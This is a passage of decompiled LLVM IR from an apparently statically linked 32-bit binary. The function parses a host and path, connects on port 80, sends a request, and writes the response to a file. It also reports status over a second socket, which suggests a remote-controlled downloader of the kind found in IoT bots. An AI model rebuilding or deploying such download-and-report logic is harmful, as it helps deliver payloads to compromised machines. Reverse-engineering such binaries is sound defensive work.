  store i32 %v2_80489c9, i32* @eax, align 4
  %v3_80489d0 = bitcast i32* %stack_var_-1096 to i8*
  %v4_80489d0 = call i32 @strcpy(i8* %v3_80489d0, i32 %v1_80489c2)
  br label %dec_label_pc_80489f5

dec_label_pc_80489da:                             ; preds = %dec_label_pc_8048970
  %v0_80489e2 = load i32, i32* @esp, align 4
  %v5_80489e2 = icmp ult i32 %v0_80489e2, 8
  store i1 %v5_80489e2, i1* %cf.global-to-local, align 1
  %v2_80489e6 = ptrtoint i32* %stack_var_-1096 to i32
  store i32 %v2_80489e6, i32* @eax, align 4
  %v3_80489ed = bitcast i32* %stack_var_-1096 to i8*
  %v4_80489ed = call i32 @strcpy(i8* %v3_80489ed, i32 %v2_80489e0)
  br label %dec_label_pc_80489f5

dec_label_pc_80489f5:                             ; preds = %dec_label_pc_80489ba, %dec_label_pc_80489da
  %v4_8048a18.pre-phi = phi i8* [ %v3_80489d0, %dec_label_pc_80489ba ], [ %v3_80489ed, %dec_label_pc_80489da ]
  %v2_8048a04.pre-phi = phi i32 [ %v2_80489c9, %dec_label_pc_80489ba ], [ %v2_80489e6, %dec_label_pc_80489da ]
  %storemerge15.in = load i32, i32* @esp, align 4
  %storemerge15 = icmp ugt i32 %storemerge15.in, -17
  store i1 %storemerge15, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048a01

dec_label_pc_80489fe:                             ; preds = %dec_label_pc_8048a29
  %v4_80489fe = add i32 %storemerge7, 1
  br label %dec_label_pc_8048a01

dec_label_pc_8048a01:                             ; preds = %dec_label_pc_80489f5, %dec_label_pc_80489fe
  %storemerge7 = phi i32 [ %v4_80489fe, %dec_label_pc_80489fe ], [ 0, %dec_label_pc_80489f5 ]
  store i32 %storemerge7, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8048a04.pre-phi, i32* @edi, align 4
  %v3_8048a1e = call i32 @_strlen(i8* %v4_8048a18.pre-phi)
  %v0_8048a25 = load i32, i32* @edx, align 4
  %v7_8048a25 = icmp ult i32 %v0_8048a25, %v3_8048a1e
  store i1 %v7_8048a25, i1* %cf.global-to-local, align 1
  %v1_8048a27 = icmp eq i1 %v7_8048a25, false
  br i1 %v1_8048a27, label %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge, label %dec_label_pc_8048a29

dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge: ; preds = %dec_label_pc_8048a01
  %v0_8048a3a.pre = load i32, i32* @ebp, align 4
  %.pre = add i32 %storemerge7, -1092
  br label %dec_label_pc_8048a37

dec_label_pc_8048a29:                             ; preds = %dec_label_pc_8048a01
  %v0_8048a2c = load i32, i32* @ebp, align 4
  %v2_8048a2c = add i32 %storemerge7, -1092
  %v3_8048a2c = add i32 %v0_8048a2c, %v2_8048a2c
  %v4_8048a2c = inttoptr i32 %v3_8048a2c to i8*
  %v5_8048a2c = load i8, i8* %v4_8048a2c, align 1
  %v6_8048a33 = icmp ult i8 %v5_8048a2c, 47
  store i1 %v6_8048a33, i1* %cf.global-to-local, align 1
  %v10_8048a33 = icmp eq i8 %v5_8048a2c, 47
  %v1_8048a35 = icmp eq i1 %v10_8048a33, false
  br i1 %v1_8048a35, label %dec_label_pc_80489fe, label %dec_label_pc_8048a37

dec_label_pc_8048a37:                             ; preds = %dec_label_pc_8048a29, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge
  %v2_8048a3a.pre-phi = phi i32 [ %.pre, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge ], [ %v2_8048a2c, %dec_label_pc_8048a29 ]
  %v0_8048a3a = phi i32 [ %v0_8048a3a.pre, %dec_label_pc_8048a01.dec_label_pc_8048a37_crit_edge ], [ %v0_8048a2c, %dec_label_pc_8048a29 ]
  %v3_8048a3a = add i32 %v0_8048a3a, %v2_8048a3a.pre-phi
  %v4_8048a3a = inttoptr i32 %v3_8048a3a to i8*
  store i8 0, i8* %v4_8048a3a, align 1
  store i32 2, i32* %stack_var_-72, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v5_8048a48 = icmp ult i32 %v0_8048a48, 12
  store i1 %v5_8048a48, i1* %cf.global-to-local, align 1
  %v1_8048a4d = call i32 @htons(i32 80)
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048a63 = call i32 @inet_addr(i32 %v2_8048a04.pre-phi)
  %v8_8048a6e = icmp ne i32 %v1_8048a63, -1
  store i1 %v8_8048a6e, i1* %cf.global-to-local, align 1
  %v13_8048a6e = icmp eq i32 %v1_8048a63, -1
  %v1_8048a72 = icmp eq i1 %v13_8048a6e, false
  br i1 %v1_8048a72, label %dec_label_pc_8048ace, label %dec_label_pc_8048a74

dec_label_pc_8048a74:                             ; preds = %dec_label_pc_8048a37
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048a7e = call i32 @__GI_gethostbyname(i32 %v2_8048a04.pre-phi)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8048a89 = icmp eq i32 %v1_8048a7e, 0
  %v1_8048a8d = icmp eq i1 %v4_8048a89, false
  br i1 %v1_8048a8d, label %dec_label_pc_8048aaf, label %dec_label_pc_8048a8f

dec_label_pc_8048a8f:                             ; preds = %dec_label_pc_8048a74
  %v5_8048a8f = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048a8f, i1* %cf.global-to-local, align 1
  %v3_8048a9d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068bc0.41 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048aaa = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048aaf

dec_label_pc_8048aaf:                             ; preds = %dec_label_pc_8048a74, %dec_label_pc_8048a8f
  %v1_8048ab2 = add i32 %v1_8048a7e, 12
  %v2_8048ab2 = inttoptr i32 %v1_8048ab2 to i32*
  %v3_8048ab2 = load i32, i32* %v2_8048ab2, align 4
  %v1_8048aba = add i32 %v1_8048a7e, 16
  %v2_8048aba = inttoptr i32 %v1_8048aba to i32*
  %v3_8048aba = load i32, i32* %v2_8048aba, align 4
  %v1_8048abd = inttoptr i32 %v3_8048aba to i32*
  %v2_8048abd = load i32, i32* %v1_8048abd, align 4
  store i32 %v2_8048abd, i32* %edx.global-to-local, align 4
  %v5_8048ac2 = icmp eq i32* %stack_var_-72, inttoptr (i32 -4 to i32*)
  store i1 %v5_8048ac2, i1* %cf.global-to-local, align 1
  %v15_8048ac2 = ptrtoint i32* %stack_var_-68 to i32
  %tmp83 = bitcast i32* %stack_var_-68 to i8*
  store i32 %v15_8048ac2, i32* @edi, align 4
  %v1_8048ac7 = inttoptr i32 %v2_8048abd to i8*
  store i32 %v2_8048abd, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048aca = call i8* @_memcpy(i8* %tmp83, i8* %v1_8048ac7, i32 %v3_8048ab2)
  %v8_8048aca = ptrtoint i8* %v7_8048aca to i32
  store i32 %v8_8048aca, i32* @ecx, align 4
  %v0_8048aea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048ad4

dec_label_pc_8048ace:                             ; preds = %dec_label_pc_8048a37
  store i32 %v1_8048a63, i32* %stack_var_-68, align 4
  br label %dec_label_pc_8048ad4

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048aaf, %dec_label_pc_8048ace
  %v0_8048aea = phi i32 [ %v0_8048aea.pre, %dec_label_pc_8048aaf ], [ %v12_80488f4, %dec_label_pc_8048ace ]
  %v2_8048ad4.pre-phi = ptrtoint i32* %stack_var_-72 to i32
  %v5_8048aea = icmp ult i32 %v0_8048aea, 4
  store i1 %v5_8048aea, i1* %cf.global-to-local, align 1
  %v4_8048af3 = call i32 @connect(i32 %v4_804893f, i32 %v2_8048ad4.pre-phi, i32 16)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048afb = icmp eq i32 %v4_8048af3, 0
  br i1 %v1_8048afb, label %dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge, label %dec_label_pc_8048aff

dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge: ; preds = %dec_label_pc_8048ad4
  br label %dec_label_pc_8048b1f

dec_label_pc_8048aff:                             ; preds = %dec_label_pc_8048ad4
  %v5_8048aff = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048aff, i1* %cf.global-to-local, align 1
  %v3_8048b0d = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8068be8.42 to i32))
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048b1a = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ad4.dec_label_pc_8048b1f_crit_edge, %dec_label_pc_8048aff
  %v2_8048b2a = add i32 %storemerge7, %v2_8048a04.pre-phi
  %v7_8048b2a = icmp ult i32 %v2_8048b2a, %v2_8048a04.pre-phi
  store i1 %v7_8048b2a, i1* %cf.global-to-local, align 1
  %v1_8048b2c = add i32 %v2_8048b2a, 1
  store i32 %v1_8048b2c, i32* %edx.global-to-local, align 4
  %v3_8048b3f = call i32 @Send(i32 %v4_804893f, i32 ptrtoint ([276 x i8]* @global_var_8068c10.43 to i32))
  %v5_8048b47 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048b47, i1* %cf.global-to-local, align 1
  %v3_8048b55 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8068d24.44 to i32))
  %v1_8048b60 = add i32 %arg4, 8
  %v5_8048b60 = icmp ugt i32 %arg4, -9
  %v1_8048b63 = inttoptr i32 %v1_8048b60 to i32*
  %v2_8048b63 = load i32, i32* %v1_8048b63, align 4
  store i32 %v2_8048b63, i32* @eax, align 4
  %v5_8048b65 = icmp ult i32* %stack_var_-5228, inttoptr (i32 8 to i32*)
  store i1 %v5_8048b65, i1* %cf.global-to-local, align 1
  %v3_8048b6e = call i32 @__GI_fopen(i32 %v2_8048b63, i32 ptrtoint ([3 x i8]* @global_var_8068d40.45 to i32))
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v2_8048b73 = icmp ugt i32 %v0_8048b73, -17
  store i1 %v2_8048b73, i1* %cf.global-to-local, align 1
  %v2_8048b80 = ptrtoint i32* %stack_var_-5192 to i32
  %v5_8048b8a121 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp84123 = icmp slt i32 %v5_8048b8a121, 1
  br i1 %tmp84123, label %dec_label_pc_8048cb6.loopexit16, label %dec_label_pc_8048b9f

dec_label_pc_8048b79.loopexit:                    ; preds = %dec_label_pc_8048ca2
  %v5_8048b8a = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp84 = icmp slt i32 %v5_8048b8a, 1
  br i1 %tmp84, label %dec_label_pc_8048cb6.loopexit16, label %dec_label_pc_8048b9f

dec_label_pc_8048b9f:                             ; preds = %dec_label_pc_8048b1f, %dec_label_pc_8048b79.loopexit
  %v5_8048b8a124 = phi i32 [ %v5_8048b8a, %dec_label_pc_8048b79.loopexit ], [ %v5_8048b8a121, %dec_label_pc_8048b1f ]
  %v4_8048b9f = add i32 %v5_8048b8a124, -4095
  %v8_8048b9f = icmp ult i32 %v5_8048b8a124, 4095
  %v9_8048b9f = sub i32 4094, %v5_8048b8a124
  %v10_8048b9f = and i32 %v9_8048b9f, %v5_8048b8a124
  %v11_8048b9f = icmp slt i32 %v10_8048b9f, 0
  store i1 %v8_8048b9f, i1* %cf.global-to-local, align 1
  %v12_8048b9f = icmp eq i32 %v4_8048b9f, 0
  %v13_8048b9f = icmp slt i32 %v4_8048b9f, 0
  %v3_8048ba6 = icmp eq i1 %v13_8048b9f, %v11_8048b9f
  %v4_8048ba6 = icmp eq i1 %v12_8048b9f, false
  %v5_8048ba6 = and i1 %v4_8048ba6, %v3_8048ba6
  br i1 %v5_8048ba6, label %dec_label_pc_8048bbf.lr.ph, label %dec_label_pc_8048ba8

dec_label_pc_8048ba8:                             ; preds = %dec_label_pc_8048b9f
  %v0_8048bab = load i32, i32* @ebp, align 4
  %v2_8048bab = add i32 %v5_8048b8a124, -5188
  %v3_8048bab = add i32 %v2_8048bab, %v0_8048bab
  %v4_8048bab = inttoptr i32 %v3_8048bab to i8*
  store i8 0, i8* %v4_8048bab, align 1
  br label %dec_label_pc_8048bbf.lr.ph

dec_label_pc_8048bbf.lr.ph:                       ; preds = %dec_label_pc_8048ba8, %dec_label_pc_8048b9f
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048bbf

dec_label_pc_8048bbf:                             ; preds = %dec_label_pc_8048bbf.lr.ph, %dec_label_pc_8048ca2
  %storemerge6120 = phi i32 [ 0, %dec_label_pc_8048bbf.lr.ph ], [ %v4_8048ca2, %dec_label_pc_8048ca2 ]
  store i32 %storemerge6120, i32* %edx.global-to-local, align 4
  %v2_8048bca = add i32 %storemerge6120, %v2_8048b80
  %v7_8048bca = icmp ult i32 %v2_8048bca, %v2_8048b80
  store i1 %v7_8048bca, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_8048be7 = inttoptr i32 %v2_8048bca to i8*
  store i32 %v2_8048bca, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8068d43.46 to i32), i32* @edi, align 4
  %v7_8048bf9 = call i32 @_strncmp(i8* %v4_8048be7, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068d43.46, i32 0, i32 0), i32 4)
  %v8_8048bf9 = urem i32 %v7_8048bf9, 2
  %v9_8048bf9 = icmp eq i32 %v8_8048bf9, 0
  %v0_8048bfb = load i1, i1* %cf.global-to-local, align 1
  %v2_8048bfb = or i1 %v0_8048bfb, %v9_8048bf9
  %v3_8048bfb = zext i1 %v2_8048bfb to i32
  %v4_8048bfb = load i32, i32* %edx.global-to-local, align 4
  %v5_8048bfb = and i32 %v4_8048bfb, -256
  %v6_8048bfb = or i32 %v3_8048bfb, %v5_8048bfb
  %v7_8048bfb = xor i32 %v6_8048bfb, 1
  store i32 %v7_8048bfb, i32* @edx, align 4
  %v3_8048c01 = and i32 %v7_8048bf9, -256
  %v1_8048c03 = trunc i32 %v7_8048bfb to i8
  %v3_8048c03 = zext i1 %v0_8048bfb to i8
  %v4_8048c03 = sub nsw i8 %v1_8048c03, %v3_8048c03
  %v15_8048c03 = icmp eq i8 %v4_8048c03, 0
  %v20_8048c03 = zext i8 %v4_8048c03 to i32
  %v23_8048c03 = or i32 %v20_8048c03, %v3_8048c01
  store i32 %v23_8048c03, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c0c = icmp eq i1 %v15_8048c03, false
  br i1 %v1_8048c0c, label %dec_label_pc_8048ca2, label %dec_label_pc_8048c12

dec_label_pc_8048c12:                             ; preds = %dec_label_pc_8048bbf
  %v4_8048c12 = add i32 %storemerge6120, 4
  %v1_8048c21 = add i32 %v3_8048b6e, 52
  %v2_8048c21 = inttoptr i32 %v1_8048c21 to i32*
  %v1_8048c2b = add i32 %v3_8048b6e, 16
  %v2_8048c2b = inttoptr i32 %v1_8048c2b to i32*
  %v1_8048c31 = add i32 %v3_8048b6e, 28
  %v2_8048c31 = inttoptr i32 %v1_8048c31 to i32*
  %v10_8048c97104 = icmp ult i32 %v4_8048c12, %v5_8048b8a124
  store i1 %v10_8048c97104, i1* %cf.global-to-local, align 1
  %v5_8048c9a110 = icmp slt i32 %v4_8048c12, %v5_8048b8a124
  br i1 %v5_8048c9a110, label %dec_label_pc_8048c18, label %dec_label_pc_8048cb6

dec_label_pc_8048c18:                             ; preds = %dec_label_pc_8048c12, %dec_label_pc_8048c91
  %storemerge12.in111 = phi i32 [ %v4_8048c91, %dec_label_pc_8048c91 ], [ %v4_8048c12, %dec_label_pc_8048c12 ]
  %v3_8048c21 = load i32, i32* %v2_8048c21, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048c24 = icmp eq i32 %v3_8048c21, 0
  br i1 %v1_8048c24, label %dec_label_pc_8048c73, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c18
  %v3_8048c2b = load i32, i32* %v2_8048c2b, align 4
  store i32 %v3_8048c2b, i32* @edx, align 4
  %v3_8048c31 = load i32, i32* %v2_8048c31, align 4
  %v7_8048c34 = icmp ult i32 %v3_8048c2b, %v3_8048c31
  store i1 %v7_8048c34, i1* %cf.global-to-local, align 1
  %v1_8048c36 = icmp eq i1 %v7_8048c34, false
  br i1 %v1_8048c36, label %dec_label_pc_8048c53, label %dec_label_pc_8048c38

dec_label_pc_8048c38:                             ; preds = %dec_label_pc_8048c28
  %v3_8048c3b = load i32, i32* %v2_8048c2b, align 4
  store i32 %v3_8048c3b, i32* %edx.global-to-local, align 4
  %v0_8048c41 = load i32, i32* @ebp, align 4
  %v2_8048c41 = add i32 %storemerge12.in111, -5188
  %v3_8048c41 = add i32 %v2_8048c41, %v0_8048c41
  %v4_8048c41 = inttoptr i32 %v3_8048c41 to i8*
  %v5_8048c41 = load i8, i8* %v4_8048c41, align 1
  %v3_8048c48 = inttoptr i32 %v3_8048c3b to i8*
  store i8 %v5_8048c41, i8* %v3_8048c48, align 1
  %v0_8048c4a = load i32, i32* %edx.global-to-local, align 4
  %v1_8048c4a = add i32 %v0_8048c4a, 1
  store i32 %v1_8048c4a, i32* @edx, align 4
  store i32 %v1_8048c4a, i32* %v2_8048c2b, align 4
  br label %dec_label_pc_8048c91

dec_label_pc_8048c53:                             ; preds = %dec_label_pc_8048c28
  %v0_8048c56 = load i32, i32* @ebp, align 4
  %v2_8048c56 = add i32 %storemerge12.in111, -5188
  %v3_8048c56 = add i32 %v2_8048c56, %v0_8048c56
  %v4_8048c56 = inttoptr i32 %v3_8048c56 to i8*
  %v5_8048c56 = load i8, i8* %v4_8048c56, align 1
  %v0_8048c62 = load i32, i32* @esp, align 4
  %v5_8048c62 = icmp ult i32 %v0_8048c62, 8
  store i1 %v5_8048c62, i1* %cf.global-to-local, align 1
  %v4_8048c69 = call i32 @putc_unlocked(i8 %v5_8048c56, i32 %v3_8048b6e)
  %v0_8048c6e = load i32, i32* @esp, align 4
  %v2_8048c6e = icmp ugt i32 %v0_8048c6e, -17
  store i1 %v2_8048c6e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c91

dec_label_pc_8048c73:                             ; preds = %dec_label_pc_8048c18
  %v0_8048c76 = load i32, i32* @ebp, align 4
  %v2_8048c76 = add i32 %storemerge12.in111, -5188
  %v3_8048c76 = add i32 %v2_8048c76, %v0_8048c76
  %v4_8048c76 = inttoptr i32 %v3_8048c76 to i8*
  %v5_8048c76 = load i8, i8* %v4_8048c76, align 1
  %v0_8048c82 = load i32, i32* @esp, align 4
  %v5_8048c82 = icmp ult i32 %v0_8048c82, 8
  store i1 %v5_8048c82, i1* %cf.global-to-local, align 1
  %v4_8048c89 = call i32 @__GI_fputc(i8 %v5_8048c76, i32 %v3_8048b6e)
  %v0_8048c8e = load i32, i32* @esp, align 4
  %v2_8048c8e = icmp ugt i32 %v0_8048c8e, -17
  store i1 %v2_8048c8e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048c91

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_8048c53, %dec_label_pc_8048c38, %dec_label_pc_8048c73
  %v4_8048c91 = add i32 %storemerge12.in111, 1
  %v10_8048c97 = icmp ult i32 %v4_8048c91, %v5_8048b8a124
  store i1 %v10_8048c97, i1* %cf.global-to-local, align 1
  %exitcond129 = icmp eq i32 %v4_8048c91, %v5_8048b8a124
  br i1 %exitcond129, label %dec_label_pc_8048cb6, label %dec_label_pc_8048c18

dec_label_pc_8048ca2:                             ; preds = %dec_label_pc_8048bbf
  %v4_8048ca2 = add nuw nsw i32 %storemerge6120, 1
  %v10_8048ca8 = icmp ult i32 %v4_8048ca2, %v5_8048b8a124
  store i1 %v10_8048ca8, i1* %cf.global-to-local, align 1
  %v5_8048cab = icmp slt i32 %v4_8048ca2, %v5_8048b8a124
  br i1 %v5_8048cab, label %dec_label_pc_8048bbf, label %dec_label_pc_8048b79.loopexit

dec_label_pc_8048cb6.loopexit16:                  ; preds = %dec_label_pc_8048b79.loopexit, %dec_label_pc_8048b1f
  %.pre30 = add i32 %v3_8048b6e, 52
  %.pre31 = inttoptr i32 %.pre30 to i32*
  %.pre33 = add i32 %v3_8048b6e, 16
  %.pre34 = inttoptr i32 %.pre33 to i32*
  %.pre35 = add i32 %v3_8048b6e, 28
  %.pre36 = inttoptr i32 %.pre35 to i32*
  br label %dec_label_pc_8048cb6

dec_label_pc_8048cb6:                             ; preds = %dec_label_pc_8048c12, %dec_label_pc_8048c91, %dec_label_pc_8048cb6.loopexit16
  %v2_8048d2e.pre-phi = phi i32* [ %.pre36, %dec_label_pc_8048cb6.loopexit16 ], [ %v2_8048c31, %dec_label_pc_8048c91 ], [ %v2_8048c31, %dec_label_pc_8048c12 ]
  %v2_8048d28.pre-phi = phi i32* [ %.pre34, %dec_label_pc_8048cb6.loopexit16 ], [ %v2_8048c2b, %dec_label_pc_8048c91 ], [ %v2_8048c2b, %dec_label_pc_8048c12 ]
  %v2_8048d1e.pre-phi = phi i32* [ %.pre31, %dec_label_pc_8048cb6.loopexit16 ], [ %v2_8048c21, %dec_label_pc_8048c91 ], [ %v2_8048c21, %dec_label_pc_8048c12 ]
  store i1 %v5_8048b60, i1* %cf.global-to-local, align 1
  %v3_8048cca = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8068d48.47 to i32))
  %v0_8048ccf = load i32, i32* @esp, align 4
  %v2_8048ccf = icmp ugt i32 %v0_8048ccf, -17
  store i1 %v2_8048ccf, i1* %cf.global-to-local, align 1
  %v5_8048ce399 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85101 = icmp slt i32 %v5_8048ce399, 1
  br i1 %tmp85101, label %dec_label_pc_8048da2, label %dec_label_pc_8048cf8

dec_label_pc_8048cd2.loopexit:                    ; preds = %dec_label_pc_8048d8e
  %v5_8048ce3 = call i32 @recv(i32 %v4_804893f, i32 %v2_8048b80, i32 4096, i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp85 = icmp slt i32 %v5_8048ce3, 1
  br i1 %tmp85, label %dec_label_pc_8048da2, label %dec_label_pc_8048cf8

dec_label_pc_8048cf8:                             ; preds = %dec_label_pc_8048cb6, %dec_label_pc_8048cd2.loopexit
  %v5_8048ce3102 = phi i32 [ %v5_8048ce3, %dec_label_pc_8048cd2.loopexit ], [ %v5_8048ce399, %dec_label_pc_8048cb6 ]
  %v4_8048cf8 = add i32 %v5_8048ce3102, -4095
  %v8_8048cf8 = icmp ult i32 %v5_8048ce3102, 4095
  %v9_8048cf8 = sub i32 4094, %v5_8048ce3102
  %v10_8048cf8 = and i32 %v9_8048cf8, %v5_8048ce3102
  %v11_8048cf8 = icmp slt i32 %v10_8048cf8, 0
  store i1 %v8_8048cf8, i1* %cf.global-to-local, align 1
  %v12_8048cf8 = icmp eq i32 %v4_8048cf8, 0
  %v13_8048cf8 = icmp slt i32 %v4_8048cf8, 0
  %v3_8048cff = icmp eq i1 %v13_8048cf8, %v11_8048cf8
  %v4_8048cff = icmp eq i1 %v12_8048cf8, false
  %v5_8048cff = and i1 %v4_8048cff, %v3_8048cff
  br i1 %v5_8048cff, label %dec_label_pc_8048d15.lr.ph, label %dec_label_pc_8048d01

dec_label_pc_8048d01:                             ; preds = %dec_label_pc_8048cf8
  %v0_8048d04 = load i32, i32* @ebp, align 4
  %v2_8048d04 = add i32 %v5_8048ce3102, -5188
  %v3_8048d04 = add i32 %v2_8048d04, %v0_8048d04
  %v4_8048d04 = inttoptr i32 %v3_8048d04 to i8*
  store i8 0, i8* %v4_8048d04, align 1
  br label %dec_label_pc_8048d15.lr.ph

dec_label_pc_8048d15.lr.ph:                       ; preds = %dec_label_pc_8048d01, %dec_label_pc_8048cf8
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d15

dec_label_pc_8048d15:                             ; preds = %dec_label_pc_8048d8e, %dec_label_pc_8048d15.lr.ph
  %storemerge498 = phi i32 [ 0, %dec_label_pc_8048d15.lr.ph ], [ %v4_8048d8e, %dec_label_pc_8048d8e ]
  %v3_8048d1e = load i32, i32* %v2_8048d1e.pre-phi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8048d21 = icmp eq i32 %v3_8048d1e, 0
  br i1 %v1_8048d21, label %dec_label_pc_8048d70, label %dec_label_pc_8048d25

dec_label_pc_8048d25:                             ; preds = %dec_label_pc_8048d15
  %v3_8048d28 = load i32, i32* %v2_8048d28.pre-phi, align 4
  store i32 %v3_8048d28, i32* @edx, align 4
  %v3_8048d2e = load i32, i32* %v2_8048d2e.pre-phi, align 4
  %v7_8048d31 = icmp ult i32 %v3_8048d28, %v3_8048d2e
  store i1 %v7_8048d31, i1* %cf.global-to-local, align 1
  %v1_8048d33 = icmp eq i1 %v7_8048d31, false
  br i1 %v1_8048d33, label %dec_label_pc_8048d50, label %dec_label_pc_8048d35

dec_label_pc_8048d35:                             ; preds = %dec_label_pc_8048d25
  %v3_8048d38 = load i32, i32* %v2_8048d28.pre-phi, align 4
  store i32 %v3_8048d38, i32* %edx.global-to-local, align 4
  %v0_8048d3e = load i32, i32* @ebp, align 4
  %v2_8048d3e = add nsw i32 %storemerge498, -5188
  %v3_8048d3e = add i32 %v2_8048d3e, %v0_8048d3e
  %v4_8048d3e = inttoptr i32 %v3_8048d3e to i8*
  %v5_8048d3e = load i8, i8* %v4_8048d3e, align 1
  %v3_8048d45 = inttoptr i32 %v3_8048d38 to i8*
  store i8 %v5_8048d3e, i8* %v3_8048d45, align 1
  %v0_8048d47 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048d47 = add i32 %v0_8048d47, 1
  store i32 %v1_8048d47, i32* @edx, align 4
  store i32 %v1_8048d47, i32* %v2_8048d28.pre-phi, align 4
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d50:                             ; preds = %dec_label_pc_8048d25
  %v0_8048d53 = load i32, i32* @ebp, align 4
  %v2_8048d53 = add nsw i32 %storemerge498, -5188
  %v3_8048d53 = add i32 %v2_8048d53, %v0_8048d53
  %v4_8048d53 = inttoptr i32 %v3_8048d53 to i8*
  %v5_8048d53 = load i8, i8* %v4_8048d53, align 1
  %v0_8048d5f = load i32, i32* @esp, align 4
  %v5_8048d5f = icmp ult i32 %v0_8048d5f, 8
  store i1 %v5_8048d5f, i1* %cf.global-to-local, align 1
  %v4_8048d66 = call i32 @putc_unlocked(i8 %v5_8048d53, i32 %v3_8048b6e)
  %v0_8048d6b = load i32, i32* @esp, align 4
  %v2_8048d6b = icmp ugt i32 %v0_8048d6b, -17
  store i1 %v2_8048d6b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d70:                             ; preds = %dec_label_pc_8048d15
  %v0_8048d73 = load i32, i32* @ebp, align 4
  %v2_8048d73 = add nsw i32 %storemerge498, -5188
  %v3_8048d73 = add i32 %v2_8048d73, %v0_8048d73
  %v4_8048d73 = inttoptr i32 %v3_8048d73 to i8*
  %v5_8048d73 = load i8, i8* %v4_8048d73, align 1
  %v0_8048d7f = load i32, i32* @esp, align 4
  %v5_8048d7f = icmp ult i32 %v0_8048d7f, 8
  store i1 %v5_8048d7f, i1* %cf.global-to-local, align 1
  %v4_8048d86 = call i32 @__GI_fputc(i8 %v5_8048d73, i32 %v3_8048b6e)
  %v0_8048d8b = load i32, i32* @esp, align 4
  %v2_8048d8b = icmp ugt i32 %v0_8048d8b, -17
  store i1 %v2_8048d8b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8048d8e

dec_label_pc_8048d8e:                             ; preds = %dec_label_pc_8048d50, %dec_label_pc_8048d35, %dec_label_pc_8048d70
  %v4_8048d8e = add nuw nsw i32 %storemerge498, 1
  %v10_8048d94 = icmp ult i32 %v4_8048d8e, %v5_8048ce3102
  store i1 %v10_8048d94, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_8048d8e, %v5_8048ce3102
  br i1 %exitcond, label %dec_label_pc_8048cd2.loopexit, label %dec_label_pc_8048d15

dec_label_pc_8048da2:                             ; preds = %dec_label_pc_8048cd2.loopexit, %dec_label_pc_8048cb6
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048da8 = inttoptr i32 %v3_8048b6e to i16*
  %v2_8048da8 = call i32 @__GI_fclose(i16* %v1_8048da8)
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048db6 = call i32 @close(i32 %v4_804893f)
  store i1 %v5_80488fa, i1* %cf.global-to-local, align 1
  %v1_8048dc3 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048dc8

dec_label_pc_8048dc8:                             ; preds = %entry, %dec_label_pc_8048da2
  %v0_8048dce = phi i32 [ %v1_8048900, %entry ], [ %v1_8048dc3, %dec_label_pc_8048da2 ]
  ret i32 %v0_8048dce

; uselistorder directives
  uselistorder i32 %storemerge498, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8048cf8, { 1, 0 }
  uselistorder i32 %v5_8048ce3102, { 0, 4, 5, 6, 3, 1, 2 }
  uselistorder i32* %v2_8048d28.pre-phi, { 2, 1, 0 }
